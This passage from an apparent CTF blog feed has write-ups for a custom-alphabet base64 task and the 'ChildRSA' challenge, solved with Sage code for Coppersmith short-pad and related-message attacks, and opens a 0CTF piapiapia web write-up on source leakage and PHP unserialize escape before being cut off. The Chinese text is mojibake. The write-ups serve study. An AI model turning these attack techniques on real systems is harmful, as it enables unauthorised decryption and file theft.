class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]]</span><br><span class="line">        tmp_res = [b_char[<span class="built_in">int</span>(x,<span class="number">2</span>)]<span class="keyword">for</span> x <span class="keyword">in</span> tmp_str]</span><br><span class="line">        res+=<span class="string">&#x27;&#x27;</span>.join(tmp_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> p2:</span><br><span class="line">        part2 = binstr[<span class="number">3</span>*p1:]</span><br><span class="line">        str_p2 = <span class="string">&#x27;&#x27;</span>.join(part2)+(<span class="number">3</span>-p2)*<span class="string">&#x27;0&#x27;</span>*<span class="number">8</span></span><br><span class="line">        tmp_str = [str_p2[x: x + <span class="number">6</span>] <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]][:p2+<span class="number">1</span>]</span><br><span class="line">        tmp_res = [b_char[<span class="built_in">int</span>(x,<span class="number">2</span>)]<span class="keyword">for</span> x <span class="keyword">in</span> tmp_str]</span><br><span class="line">        res+=<span class="string">&#x27;&#x27;</span>.join(tmp_res)</span><br><span class="line">        res +=<span class="string">&#x27;=&#x27;</span>*(<span class="number">3</span>-p2)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"> </span><br><span class="line">m1=random.sample(<span class="built_in">list</span>(b_char),<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(m1)</span><br><span class="line"><span class="built_in">print</span> encode(m1)</span><br><span class="line"><span class="built_in">print</span> encode(flag)</span><br><span class="line"><span class="comment"># rTcb1BR8YVW2EOUjweXpIiLt5QCNg7ZAsD9muq3ylMhvofnx/P</span></span><br><span class="line"><span class="comment"># 2Br9y9fcu97zvB2OruZv0D3Bwhbj0uNQnvfdtC2TwAfPrdBJ3xeP4wNn0hzLzCVUlRa=</span></span><br><span class="line"><span class="comment"># tCvM4R3TzvZ7nhjBxSiNyxmP28e7qCjVxQn91SRM3gBKzxQ=</span></span><br></pre></td></tr></table></figure><p>çœ‹äº†ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹, å°±æ˜¯ä¸ªbase64, ä½†æ˜¯è¡¨æœªçŸ¥, ç›´æ¥é€šè¿‡ä¸€å¯¹æ˜æ–‡å’Œå¯†æ–‡å›æ¨è¡¨, å¾—å‡ºéƒ¨åˆ†è¡¨åŸºæœ¬ä¸Šå°±èƒ½çŒœå‡ºæ•´ä¸ªè¡¨äº†, ç›´æ¥ç”¨æ”¹è¿‡çš„è¡¨è§£ç å°±è¡Œäº†.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><blockquote><p> å½“æ—¶åšçš„æ—¶å€™çš„è„šæœ¬ä¸è§äº†5555555</p></blockquote><h1 id="0x01-ä½ ä»¬ä¸€å¤©å¤©çš„ä¸å†™ä»£ç -éš¾é“æ˜¯åœ¨ç­‰å¾…çˆ±æƒ…"><a href="#0x01-ä½ ä»¬ä¸€å¤©å¤©çš„ä¸å†™ä»£ç -éš¾é“æ˜¯åœ¨ç­‰å¾…çˆ±æƒ…" class="headerlink" title="0x01 ä½ ä»¬ä¸€å¤©å¤©çš„ä¸å†™ä»£ç , éš¾é“æ˜¯åœ¨ç­‰å¾…çˆ±æƒ…"></a>0x01 ä½ ä»¬ä¸€å¤©å¤©çš„ä¸å†™ä»£ç , éš¾é“æ˜¯åœ¨ç­‰å¾…çˆ±æƒ…</h1><p>å¤å…¸å¤§æ··åˆ, ä»€ä¹ˆé“¶æ²³å­—æ¯, å¤ç²¾çµâ€¦..ä¸æ‰¾äº†</p><h1 id="0x02-ChildRSA"><a href="#0x02-ChildRSA" class="headerlink" title="0x02  ChildRSA"></a>0x02  ChildRSA</h1><h2 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#childrsa.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag1,flag2,padding1,padding2</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag1)==<span class="number">20</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag1)&gt;<span class="built_in">len</span>(flag2)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag2)==<span class="built_in">len</span>(padding2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init1</span>():</span></span><br><span class="line">    m=(padding1*<span class="number">2</span>**<span class="number">200</span>+bytes_to_long(flag1))*<span class="number">2</span>**<span class="number">200</span></span><br><span class="line">    r1=getPrime(<span class="number">170</span>)</span><br><span class="line">    r2=getPrime(<span class="number">170</span>)</span><br><span class="line">    p=getPrime(<span class="number">1024</span>)</span><br><span class="line">    q=getPrime(<span class="number">1024</span>)</span><br><span class="line">    N=p*q</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> m,r1,r2,N</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc1</span>(<span class="params">m,r1,r2,N</span>):</span></span><br><span class="line">    c1=<span class="built_in">pow</span>(m+r1,<span class="number">3</span>,N)</span><br><span class="line">    c2=<span class="built_in">pow</span>(m+r2,<span class="number">3</span>,N)</span><br><span class="line">    <span class="keyword">return</span> c1,c2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init2</span>():</span></span><br><span class="line">    prefix = <span class="number">2</span>**<span class="number">1000</span></span><br><span class="line">    r3 = prefix+flag2*<span class="number">2</span>**<span class="number">200</span></span><br><span class="line">    r4 = <span class="number">2</span>*prefix+padding2*<span class="number">2</span>**<span class="number">200</span></span><br><span class="line">    <span class="keyword">return</span> r3,r4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc2</span>(<span class="params">r3,r4</span>):</span></span><br><span class="line">    c3 = <span class="built_in">pow</span>(r3*r4,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> c3</span><br><span class="line"></span><br><span class="line">(m,r1,r2,N) = init1()</span><br><span class="line">(c1,c2)=enc1(m,r1,r2,N)</span><br><span class="line">(r3,r4) = init2()</span><br><span class="line">c3 = enc2(r3,r4)</span><br><span class="line"><span class="built_in">print</span> N</span><br><span class="line">print(c1,c2,c3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output.txt</span></span><br><span class="line">N= ...</span><br><span class="line">(c1,c2,c3)= ...</span><br></pre></td></tr></table></figure><p>å°±æ˜¯è¿™é“é¢˜åšäº†åŠå¤©éƒ½æ²¡å‡ºæ¥, å½“æ—¶è¯•äº†å¥½ä¹…çš„Coppersmithâ€™s short-pad attack(åé¢ç®€å†™ä¸ºCsp atk, è¿$\epsilon$éƒ½ä»0.01éå†åˆ°1äº†, ä¾æ—§æ²¡æœ‰å‡ºç»“æœ, çœ‹äº†å®˜æ–¹wp, WTF??? $\beta$è°ƒæˆ1???, ä¸ºä»€ä¹ˆ?</p><p>æŠ±ç€è¿™ä¸ªé—®é¢˜æˆ‘åˆé‡æ–°ç¿»äº†ä¸€ä¸‹Sagemathæ–‡æ¡£, æ‰¾åˆ°äº†<code>small_roots()</code>çš„è§£é‡Š:</p><blockquote><p><strong>sage.rings.polynomial.polynomial_modn_dense_ntl.small_roots(<em>self</em>, <em>X=None</em>, <em>beta=1.0</em>, <em>epsilon=None</em>, <em>**kwds</em>)</strong></p><p>â€‹        Let $N$ be the characteristic of the base ring this polynomial is defined over: <em><strong>N = self.base_ring().characteristic()</strong></em>. This method returns small roots of this polynomial modulo some factor $b$ of $N$ with the constraint that $b&gt;=N^Î²$. Small in this context means that if $x$ is a root of $f$ modulo $b$ then $|x|&lt;X$. This $X$ is either provided by the user or the maximum $X$ is chosen such that this algorithm terminates in polynomial time. If $X$ is chosen automatically it is $X=ceil(1/2N^{Î²^2/Î´âˆ’Ïµ})$. The algorithm may also return some roots which are larger than <em>X</em>. This algorithm in this context means Coppersmithâ€™s algorithm for finding small roots using the LLL algorithm. The implementation of this algorithm follows Alexander Mayâ€™s PhD thesis referenced below.</p><p>INPUT:</p><ul><li><code>X</code> â€“ an absolute bound for the root (default: see above)</li><li><code>beta</code> â€“ compute a root mod $b$ where $b$ is a factor of <em>N</em> and $b â‰¥N^Î².$ ( Default: 1.0, so $b=N$. )</li><li><code>epsilon</code> â€“ the parameter $Ïµ$ described above. (Default: $Î²/8$)</li><li><code>**kwds</code> â€“ passed through to method <a href="https://doc.sagemath.org/html/en/reference/matrices/sage/matrix/matrix_integer_dense.html#sage.matrix.matrix_integer_dense.Matrix_integer_dense.LLL"><code>Matrix_integer_dense.LLL()</code></a>.</li></ul><p>REFERENCES:</p><p>Don Coppersmith. <em>Finding a small root of a univariate modular equation.</em> In Advances in Cryptology, EuroCrypt 1996, volume 1070 of Lecture Notes in Computer Science, p. 155â€“165. Springer, 1996. <a href="http://cr.yp.to/bib/2001/coppersmith.pdf">http://cr.yp.to/bib/2001/coppersmith.pdf</a></p><p>Alexander May. <em>New RSA Vulnerabilities Using Lattice Reduction Methods.</em> PhD thesis, University of Paderborn, 2003. <a href="http://www.cs.uni-paderborn.de/uploads/tx_sibibtex/bp.pdf">http://www.cs.uni-paderborn.de/uploads/tx_sibibtex/bp.pdf</a></p></blockquote><p>æ–‡æ¡£é‡Œé¢ç»™å‡ºäº†<code>small_roots()</code>ä½¿ç”¨çš„ç®—æ³•çš„paper, æœ‰æ—¶é—´å¥½å¥½çœ‹ä¸€ä¸‹.<br>è¿™ä¸ªå‡½æ•°éœ€è¦æ³¨æ„çš„æœ‰ä¸‰ä¸ªå‚æ•°<code>X,beta,epsilon</code>, å…¶ä¸­<code>beta</code>å’Œ<code>epsilon</code>ä¹Ÿå°±æ˜¯$\beta$å’Œ$ \epsilon$ .</p><p>æ¥çœ‹çœ‹è¿™ä¸‰ä¸ªå‚æ•°éƒ½è¯¥æ€ä¹ˆå¡«</p><ul><li>$X$:  è¿™ä¸ªç®—æ˜¯æœ€å¥½å¡«çš„, å¯ä»¥ç†è§£æˆ<code>smallroot</code>çš„ä¸Šç•Œ, ä¸€èˆ¬æ¥è¯´é¢˜ç›®ä¸­ç»™å‡ºäº†è¦è§£çš„å°æ ¹çš„ä½æ•°<code>kbits</code>å°±è®¾ç½®$X = 2^{kbits}$. è€Œåœ¨Csp atkä¸­, ç†è®ºå¯è§£ä¸Šç•Œæ˜¯$N.nbits \over e^2$ </li><li>$\beta$:   è¿™ä¸ª$\beta$å¯ä»¥ç†è§£æˆ$N$çš„å› å­çš„ä¸‹ç•Œ, å¯¹äºå¸¸è§„RSAä¸­çš„$N$, ä¸€èˆ¬å°±åªæœ‰$1,N,p,q$å››ä¸ªå› å­, æˆ‘ä»¬å¯ä»¥é€‰å–$N,p,q$ä½œä¸ºç®—æ³•ä½¿ç”¨çš„å› å­, æ‰€ä»¥å…¶å®$\beta$å¯ä»¥ä»0å–åˆ°1, å› ä¸ºéƒ½å¯èƒ½æˆç«‹, ä½†çœŸæ­£ç”¨çš„æ—¶å€™ä¸€èˆ¬å–$[0.4,0.6] \cup {1}$.</li><li>$\epsilon$: ç¥å¥‡çš„å‚æ•°, ä¸å¡«å°±æ˜¯$\beta \over 8$, æ–‡æ¡£ä¸­ç»™å‡ºäº†ä¸€ä¸ªå…³ç³»å¼$X=ceil(1/2N^{Î²^2/Î´âˆ’Ïµ})$, å…¶å®è¿™ä¸ª$ceil$å¯ä»¥æš‚æ—¶å¿½ç•¥æ‰, æ‰€ä»¥å°±æœ‰$2X=N^{\beta^2/\delta-\epsilon}$, æ–‡æ¡£é‡Œå¹¶æ²¡æœ‰ç»™å‡º$\delta$ åˆ°åº•è¯¥å¦‚ä½•å–, ä½†ä»è¿™é¢˜çš„å®˜æ–¹wpä¸­æ˜¯ç»™å‡ºäº†$\delta = e^2$, å…¶å®å°±æ˜¯å¤šé¡¹å¼çš„æ¬¡æ•°. æ‰€ä»¥å¯¹äºCsp atkæ¥è¯´, $\epsilon = \beta^{2} / e^2 - x$, $x$çš„å–æ³•ä¸º$N^x = X.nbits $</li></ul><p>æ‰€ä»¥è¯´,$\beta$å¡«1ä¹Ÿæ˜¯é˜”ä»¥çš„! å› ä¸ºfactoré‡Œé¢æ˜¯æœ‰$N$çš„!</p><p>æŒ‰ç€ä¸Šé¢çš„åˆ†æ, æŠŠä»Laä½¬é‚£è¾¹æ‹¿æ¥çš„Csp atkçš„æ¿å­ç¨å¾®ä¿®æ”¹ä¸€ä¸‹( ä»¥åå°±ç”¨æ”¹è¿›è¿‡çš„æ¿å­äº†å˜¿å˜¿å˜¿â€¦.</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n , kbits = <span class="number">0</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> kbits == <span class="number">0</span> :</span><br><span class="line">            kbits = n.nbits()//(e*e)</span><br><span class="line">        PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        g1 = x^e - c1</span><br><span class="line">        g2 = (x+y)^e - c2</span><br><span class="line">        q1 = g1.change_ring(PRZZ)</span><br><span class="line">        q2 = g2.change_ring(PRZZ)</span><br><span class="line">        h = q2.resultant(q1)</span><br><span class="line">        h = h.univariate_polynomial()</span><br><span class="line">        h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">        h = h.monic()</span><br><span class="line">        x = ceil(n.nbits() // kbits)</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> [<span class="number">0.4</span>,<span class="number">0.5</span>,<span class="number">0.6</span>,<span class="number">1</span>]:</span><br><span class="line">            eps = (b^<span class="number">2</span>) / (e^<span class="number">2</span>) - (<span class="number">1</span>/x)</span><br><span class="line">            print(eps)</span><br><span class="line">            <span class="keyword">if</span> eps &lt;= <span class="number">0</span>:</span><br><span class="line">                eps = b / <span class="number">8</span></span><br><span class="line">            print(<span class="string">&#x27;[+] try beta=&#123;&#125; epsilon=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">float</span>(b),<span class="built_in">float</span>(eps)))</span><br><span class="line">            diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=b,epsilon=eps)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(diff) &gt; <span class="number">0</span> :</span><br><span class="line">                print(<span class="string">&#x27;[+] find diff with beta=&#123;&#125; and epsilon=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(b,eps))</span><br><span class="line">                <span class="keyword">return</span> diff</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">&#x27;[-] can not find the diff&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> diff</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b</span><br><span class="line">n = ...</span><br><span class="line">(c1,c2,c3)= ...</span><br><span class="line">e= <span class="number">3</span></span><br><span class="line">diff = short_pad_attack(c1,c2,e,n,kbits=<span class="number">170</span>)[<span class="number">0</span>]</span><br><span class="line">res = related_message_attack(c1,c2,diff,e,n)</span><br><span class="line">l2b(res)</span><br><span class="line"><span class="comment"># b&#x27;\xd4!I\x80M\xf0\x80\\\xd9&gt;\x19\xad\xdd^\x1d$\x99\xc1V\xc9/+\xdc\x97&quot;\xb3 \x03\xef3\xd1\xea\x04\xf4\x81z$\xd2]&#123;\xcb\xc4\x93\xe7\xf6\xb7\x9a\xb2\xe6a\x9fl\x99\xady\xa8\x9e\xa2\xf5\&#x27;\xa2\xfc\xe0Z\xa1\x1c\x15\rQ\x7fM\x99T\x93\x04\xc5\xdd\xdc\x80\xe4\x0f\x85)\x9f\xc3p\xdc\x03j.\x87kU\&#x27;Ud\x0bD&quot;)\x00\x00\x00\x00\x00Nep&#123;Nep_n3p_ba4_bad_\x00\x00\x00\x03\tx@Q2\x1b3\x1f\r\xb2\x95\x86?kE\x1f\xe6\xaay\xf1\xe5&#x27;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°flagå·²ç»å‡ºæ¥ä¸€éƒ¨åˆ†äº†<code>Nep&#123;Nep_n3p_ba4_bad_</code></p><p>æ¥çœ‹çœ‹æ€ä¹ˆæ±‚<code>flag2</code>, å…ˆæŠŠç»™çš„æ¡ä»¶å†™å‡ºæ¥, æˆ‘ä»¬è®°$flag_2 = f , padding = pd$<br>$$<br>r_3 = 2^{1000}+ 2^{200}f \\<br>r_4 = 2^{1001}+ 2^{200}pd \\<br>(r_3r_4)^3 = c_3<br>$$<br>å®˜æ–¹wpä¸Šé¢è¯´æƒ³è€ƒä¸€ä¸‹äºŒå…ƒçš„Coopersmith, å…ˆæ”¾ç€, æœ‰ç©ºäº†å­¦ä¹ ä¸€æ³¢. è¿™é¢˜è¿˜å¯ä»¥ç›´æ¥è§£ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ç›´æ¥å‡º</p><h2 id="è§£æ–¹ç¨‹è§£æ³•"><a href="#è§£æ–¹ç¨‹è§£æ³•" class="headerlink" title="è§£æ–¹ç¨‹è§£æ³•"></a>è§£æ–¹ç¨‹è§£æ³•</h2><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡å¼€ä¸‰æ¬¡æ–¹å¾—å‡º$r_3r_4 = R$<br>å’±ä»¬å…ˆè”ç«‹ä¸€ä¸‹$r3,r4$çš„ä¸¤ä¸ªå¼å­<br>$$<br>2^{2001} + 2^{1200}pd +2^{1201}f+ 2^{400} pd \cdot f = r_{34} \tag1<br>$$<br>è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹, $pd,f \le 2^{160}$, ä¹Ÿå°±æ˜¯è¯´$2^{400} pd \cdot f &lt; 2^{1200}$æ‰€ä»¥å…¶å®å’±ä»¬å¯ä»¥ç›´æ¥æœ‰<br>$$<br>2^{2001} + 2^{1200}pd +2^{1201}f+ 2^{400} pd \cdot f \equiv 2^{400}pd \cdot f \equiv r_{34} \mod 2^{1200} \\<br>2^{400}pd \cdot f = r_{34} % \ 2^{1200}<br>$$<br>è¿™æ ·æˆ‘ä»¬å°±èƒ½æ±‚å‡º$pd \cdot f = a$äº†, ç„¶åæˆ‘ä»¬ç›´æ¥$(1)$å¼ä¸¤è¾¹åŒæ—¶ä¹˜$f$, æŠŠ$pd \cdot f$å¸¦å…¥, å°±å¯ä»¥æ„é€ å‡ºä¸€ä¸ªå…³äº$f$çš„ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹äº†.<br>$$<br>2^{2001} \cdot f + 2^{1200} a +2^{1201}f^2+ 2^{400} a \cdot f = r_{34} \cdot f<br>$$<br>è§£å‡º$f$å‘ç°â€¦æ˜¯å‡flag, mdæˆ‘ç®—äº†é‚£ä¹ˆä¹…å±…ç„¶æ˜¯ä¸ªå‡çš„??? çªç„¶æƒ³åˆ°ä¼šä¸ä¼špadding2æ‰æ˜¯çœŸæ­£çš„flag, åˆæŠŠpadding2ç®—å‡ºæ¥äº†, æœç„¶â€¦.padding2æ‰æ˜¯çœŸflag</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="built_in">int</span>(c3.nth_root(<span class="number">3</span>) % (<span class="number">2</span>^<span class="number">2001</span>))</span><br><span class="line">pdf =  <span class="built_in">int</span>(c %<span class="number">2</span>^<span class="number">1200</span> // <span class="number">2</span>^<span class="number">400</span>)</span><br><span class="line">x = var(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">f = <span class="number">2</span>^<span class="number">1200</span> * pdf - c * x + <span class="number">2</span>^<span class="number">1201</span> * x^<span class="number">2</span> + <span class="number">2</span>^<span class="number">400</span> * x * pdf</span><br><span class="line">flag2  = <span class="built_in">int</span>(f.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">padding = pdf // flag2</span><br><span class="line">l2b(padding)</span><br><span class="line"><span class="comment"># b&#x27;1_l0v3_9ou&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€åçš„flagå°±æ˜¯<code>Nep&#123;Nep_n3p_ba4_bad_1_l0v3_9ou&#125;</code></p><h1 id="0x03-easyEncryption"><a href="#0x03-easyEncryption" class="headerlink" title="0x03 easyEncryption"></a>0x03 easyEncryption</h1><blockquote><p>æš‚æ—¶è¿˜æ²¡æ—¶é—´, æœ‰ç©ºçœ‹çœ‹</p></blockquote><h1 id="0x04-lowExponent"><a href="#0x04-lowExponent" class="headerlink" title="0x04 lowExponent"></a>0x04 lowExponent</h1><blockquote><p>æš‚æ—¶è¿˜æ²¡æ—¶é—´, æœ‰ç©ºçœ‹çœ‹</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¤ªèœäº†å¤ªèœäº†å¤ªèœäº†, è™½ç„¶è¯´è·‘å‡ºå»ç©äº†ä¸¤å¤©, ä½†è¿˜æ˜¯èŠ±äº†åŠå¤©æ—¶é—´åšçš„, ä¸€é“Coppersmithâ€™s short-pad attackæ²¡æœ‰æƒ³åˆ°è°ƒ$\beta$, åšäº†åŠå¤©éƒ½æ²¡å‡ºæ¥, å±å®æ‹‰äº†. æœ€åä¹Ÿå°±åšäº†ä¸ªæ”¹è¡¨çš„base64â€¦.ç®—æ˜¯é™¤äº†ç­¾åˆ°å°±æ²¡å‡ºå§(è¿˜æœ‰é“å¤å…¸ä¸æƒ³æŸ¥äº†5</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Noting of [0CTF 2016]piapiapia</title>
    <link href="http://tearsjin.github.io/2021/03/23/Noting-of-0CTF-2016-piapiapia/"/>
    <id>http://tearsjin.github.io/2021/03/23/Noting-of-0CTF-2016-piapiapia/</id>
    <published>2021-03-23T12:26:47.000Z</published>
    <updated>2021-03-23T12:35:26.296Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>è¿™é¢˜ç®—æ˜¯ç¬¬ä¸€æ¬¡åšæ¯”è¾ƒé•¿çš„webé¢˜, æ”¶è·å¾ˆå¤š, å¥½å¥½è®°å½•ä¸€ä¸‹</p></blockquote><h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>è¿™é“é¢˜ä¸»è¦çš„è€ƒå¯Ÿç‚¹æœ‰:</p><ol><li>æºç æ³„éœ²</li><li>æ•°ç»„ç»•è¿‡æ­£åˆ™åŒ¹é…å’Œ<code>strlen()</code></li><li>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</li></ol><h1 id="æºç æ³„éœ²"><a href="#æºç æ³„éœ²" class="headerlink" title="æºç æ³„éœ²"></a>æºç æ³„éœ²</h1><p>å°±ä¸€ä¸ªç™»å½•é¡µé¢, éšä¾¿è¾“å…¥å°è¯•å¼±å¯†ç ç™»å½•æ— æœ.<br>æµ‹è¯•æ˜¯å¦å­˜åœ¨sql, ä¹Ÿæ²¡ä»€ä¹ˆæ”¶è·<br>éšæ‰‹ä¸€è¯•<code>www.zip</code>, å¯ä»¥ä¸‹è½½ å­˜åœ¨æºç æ³„éœ²</p><p>æºç ä¸»è¦æœ‰è¿™å‡ ä¸ªæ–‡ä»¶:</p><ul><li>update.php</li><li>register.php</li><li>profile.php</li><li>index.php</li><li>config.php</li><li>class.php</li></ul><h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h1><h2 id="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h2><p>åšctfè‚¯å®šè¦æ‰¾flag, <code>config.php</code>ä¸­å°±æœ‰<code>$flag</code>, æ‰€ä»¥è¦æƒ³åŠæ³•è¯»å–<code>config.php</code>.<br>å¤§æ¦‚æµè§ˆäº†ä¸€ä¸‹, åœ¨<code>profile.php</code>ä¸­å‘ç°äº†è¿™ä¹ˆä¸€è¡Œ<br> <code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code></p><p>å†å¾€ä¸Šæ‰¾æ‰¾çœ‹è¿™ä¸ªå‡½æ•°ä¸­çš„å‚æ•°æ˜¯å¦å¯æ§, ä¸‹é¢æ˜¯å¾€ä¸Šæ‰¾çš„è¿‡ç¨‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// profile.php</span></span><br><span class="line"><span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>); </span><br><span class="line"><span class="comment">// å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–æ¼æ´, ä¹Ÿå¯ä»¥çŸ¥é“è¿™é‡Œçš„$profileæ˜¯ä¸ªåºåˆ—åŒ–ä¸², ç»§ç»­å¾€å‰</span></span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span 